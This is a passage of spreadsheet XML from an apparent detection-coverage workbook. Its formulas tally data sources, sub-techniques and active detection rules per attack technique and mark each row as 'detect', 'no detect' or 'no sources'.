        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O423" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P423" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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23" t="s">
        <v>386</v>
      </c>
      <c r="U423" t="s">
        <v>2075</v>
      </c>
      <c r="V423" t="s">
        <v>2076</v>
      </c>
      <c r="W423" t="b">
        <v>1</v>
      </c>
      <c r="X423" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="424" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A424" t="s">
        <v>2063</v>
      </c>
      <c r="B424" t="s">
        <v>2077</v>
      </c>
      <c r="C424" t="s">
        <v>2078</v>
      </c>
      <c r="D424" t="s">
        <v>2064</v>
      </c>
      <c r="E424" t="s">
        <v>2079</v>
      </c>
      <c r="F424" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G424" s="9" cm="1">
        <f t="array" ref="G424">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H424" s="9" t="str" cm="1">
        <f t="array" ref="H424">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I424" s="9" t="str" cm="1">
        <f t="array" ref="I424">IF(SUM(IF($C424=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C424=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J424" s="9" t="str" cm="1">
        <f t="array" ref="J42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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M424" s="9" cm="1">
        <f t="array" ref="M424">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N424" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O424" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P424" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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24" t="s">
        <v>503</v>
      </c>
      <c r="U424" t="s">
        <v>2080</v>
      </c>
      <c r="V424" t="s">
        <v>2081</v>
      </c>
      <c r="W424" t="b">
        <v>1</v>
      </c>
      <c r="X424" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="425" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A425" t="s">
        <v>2063</v>
      </c>
      <c r="B425" t="s">
        <v>2082</v>
      </c>
      <c r="C425" t="s">
        <v>2083</v>
      </c>
      <c r="D425" t="s">
        <v>2064</v>
      </c>
      <c r="E425" t="s">
        <v>777</v>
      </c>
      <c r="F425" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G425" s="9" cm="1">
        <f t="array" ref="G425">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H425" s="9" t="str" cm="1">
        <f t="array" ref="H425">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I425" s="9" t="str" cm="1">
        <f t="array" ref="I425">IF(SUM(IF($C425=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C425=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J425" s="9" t="str" cm="1">
        <f t="array" ref="J42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25" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M425" s="9" cm="1">
        <f t="array" ref="M425">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N425" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O425" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P425" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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25" t="s">
        <v>861</v>
      </c>
      <c r="U425" t="s">
        <v>2084</v>
      </c>
      <c r="V425" t="s">
        <v>2085</v>
      </c>
      <c r="W425" t="b">
        <v>1</v>
      </c>
      <c r="X425" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="426" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A426" t="s">
        <v>2063</v>
      </c>
      <c r="B426" t="s">
        <v>2086</v>
      </c>
      <c r="C426" t="s">
        <v>2087</v>
      </c>
      <c r="D426" t="s">
        <v>2064</v>
      </c>
      <c r="E426" t="s">
        <v>2088</v>
      </c>
      <c r="F426" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G426" s="9" cm="1">
        <f t="array" ref="G426">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H426" s="9" t="str" cm="1">
        <f t="array" ref="H426">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I426" s="9" t="str" cm="1">
        <f t="array" ref="I426">IF(SUM(IF($C426=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C426=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J426" s="9" t="str" cm="1">
        <f t="array" ref="J42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26" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M426" s="9" cm="1">
        <f t="array" ref="M426">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N426" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O426" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P426" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S42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26" t="s">
        <v>386</v>
      </c>
      <c r="U426" t="s">
        <v>2089</v>
      </c>
      <c r="V426" t="s">
        <v>2090</v>
      </c>
      <c r="W426" t="b">
        <v>1</v>
      </c>
      <c r="X426" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="427" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A427" t="s">
        <v>2063</v>
      </c>
      <c r="B427" t="s">
        <v>2091</v>
      </c>
      <c r="C427" t="s">
        <v>307</v>
      </c>
      <c r="D427" t="s">
        <v>2064</v>
      </c>
      <c r="E427" t="s">
        <v>2092</v>
      </c>
      <c r="F427" s="9">
        <f t="shared" si="6"/>
        <v>5</v>
      </c>
      <c r="G427" s="9" cm="1">
        <f t="array" ref="G427">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H427" s="9" t="str" cm="1">
        <f t="array" ref="H427">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I427" s="9" t="str" cm="1">
        <f t="array" ref="I427">IF(SUM(IF($C427=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C427=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J427" s="9" t="str" cm="1">
        <f t="array" ref="J42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27" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M427" s="9" cm="1">
        <f t="array" ref="M427">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N427" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O427" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P427" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S42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27" t="s">
        <v>1010</v>
      </c>
      <c r="U427" t="s">
        <v>2093</v>
      </c>
      <c r="W427" t="b">
        <v>1</v>
      </c>
      <c r="X427" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="428" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A428" t="s">
        <v>2063</v>
      </c>
      <c r="B428" t="s">
        <v>2094</v>
      </c>
      <c r="C428" t="s">
        <v>2095</v>
      </c>
      <c r="D428" t="s">
        <v>2064</v>
      </c>
      <c r="E428" t="s">
        <v>2096</v>
      </c>
      <c r="F428" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G428" s="9" cm="1">
        <f t="array" ref="G428">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H428" s="9" t="str" cm="1">
        <f t="array" ref="H428">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I428" s="9" t="str" cm="1">
        <f t="array" ref="I428">IF(SUM(IF($C428=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C428=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J428" s="9" t="str" cm="1">
        <f t="array" ref="J42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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M428" s="9" cm="1">
        <f t="array" ref="M428">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N428" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O428" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P428" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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28" t="s">
        <v>2097</v>
      </c>
      <c r="U428" t="s">
        <v>2098</v>
      </c>
      <c r="W428" t="b">
        <v>1</v>
      </c>
      <c r="X428" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="429" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A429" t="s">
        <v>2063</v>
      </c>
      <c r="B429" t="s">
        <v>2099</v>
      </c>
      <c r="C429" t="s">
        <v>2100</v>
      </c>
      <c r="D429" t="s">
        <v>2064</v>
      </c>
      <c r="E429" t="s">
        <v>2101</v>
      </c>
      <c r="F429" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G429" s="9" cm="1">
        <f t="array" ref="G429">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H429" s="9" t="str" cm="1">
        <f t="array" ref="H429">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I429" s="9" t="str" cm="1">
        <f t="array" ref="I429">IF(SUM(IF($C429=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C429=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J429" s="9" t="str" cm="1">
        <f t="array" ref="J42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29" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M429" s="9" cm="1">
        <f t="array" ref="M429">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N429" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O429" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P429" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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29" t="s">
        <v>386</v>
      </c>
      <c r="U429" t="s">
        <v>2102</v>
      </c>
      <c r="W429" t="b">
        <v>1</v>
      </c>
      <c r="X429" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="430" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A430" t="s">
        <v>2063</v>
      </c>
      <c r="B430" t="s">
        <v>2103</v>
      </c>
      <c r="C430" t="s">
        <v>2104</v>
      </c>
      <c r="D430" t="s">
        <v>2064</v>
      </c>
      <c r="E430" t="s">
        <v>2105</v>
      </c>
      <c r="F430" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G430" s="9" cm="1">
        <f t="array" ref="G430">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H430" s="9" t="str" cm="1">
        <f t="array" ref="H430">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I430" s="9" t="str" cm="1">
        <f t="array" ref="I430">IF(SUM(IF($C430=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C430=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J430" s="9" t="str" cm="1">
        <f t="array" ref="J43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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M430" s="9" cm="1">
        <f t="array" ref="M430">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N430" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O430" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P430" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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30" t="s">
        <v>2106</v>
      </c>
      <c r="U430" t="s">
        <v>2107</v>
      </c>
      <c r="W430" t="b">
        <v>1</v>
      </c>
      <c r="X430" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="431" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A431" t="s">
        <v>2108</v>
      </c>
      <c r="B431" t="s">
        <v>2108</v>
      </c>
      <c r="C431" t="s">
        <v>20</v>
      </c>
      <c r="D431" t="s">
        <v>806</v>
      </c>
      <c r="E431" t="s">
        <v>2109</v>
      </c>
      <c r="F431" s="9">
        <f t="shared" si="6"/>
        <v>5</v>
      </c>
      <c r="G431" s="9" cm="1">
        <f t="array" ref="G431">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H431" s="9" cm="1">
        <f t="array" ref="H431">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I431" s="9" t="str" cm="1">
        <f t="array" ref="I431">IF(SUM(IF($C431=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C431=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J431" s="9" cm="1">
        <f t="array" ref="J43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431" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M431" s="9" cm="1">
        <f t="array" ref="M431">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N431" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O431" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P431" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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31" t="s">
        <v>425</v>
      </c>
      <c r="U431" t="s">
        <v>2110</v>
      </c>
      <c r="V431" t="s">
        <v>2111</v>
      </c>
      <c r="W431" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="432" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A432" t="s">
        <v>2108</v>
      </c>
      <c r="B432" t="s">
        <v>2112</v>
      </c>
      <c r="C432" t="s">
        <v>325</v>
      </c>
      <c r="D432" t="s">
        <v>806</v>
      </c>
      <c r="E432" t="s">
        <v>2113</v>
      </c>
      <c r="F432" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G432" s="9" cm="1">
        <f t="array" ref="G432">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H432" s="9" t="str" cm="1">
        <f t="array" ref="H432">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I432" s="9" t="str" cm="1">
        <f t="array" ref="I432">IF(SUM(IF($C432=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C432=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J432" s="9" t="str" cm="1">
        <f t="array" ref="J43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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M432" s="9" cm="1">
        <f t="array" ref="M432">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N432" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O432" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P432" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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32" t="s">
        <v>386</v>
      </c>
      <c r="U432" t="s">
        <v>2114</v>
      </c>
      <c r="V432" t="s">
        <v>2115</v>
      </c>
      <c r="W432" t="b">
        <v>1</v>
      </c>
      <c r="X432" t="s">
        <v>2108</v>
      </c>
    </row>
    <row r="433" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A433" t="s">
        <v>2108</v>
      </c>
      <c r="B433" t="s">
        <v>2116</v>
      </c>
